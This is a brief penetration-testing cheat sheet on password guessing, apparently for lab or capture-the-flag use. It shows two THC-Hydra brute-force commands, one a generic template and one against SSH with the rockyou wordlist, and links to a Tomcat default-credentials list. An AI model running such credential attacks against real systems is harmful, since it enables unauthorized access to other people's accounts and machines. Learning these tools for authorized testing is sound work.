# Password Guessing

## THC-Hydra

    hydra -l username -P password_file.txt -s port -f ip_address request_method /path
    hydra -l john -P rockyou.txt -t 6 ssh://10.10.10.NNN

## References

* http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
* https://tools.kali.org/password-attacks/hydra
* [Apache Tomcat Default Credentials - Dictionary Attack Payoad](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt)
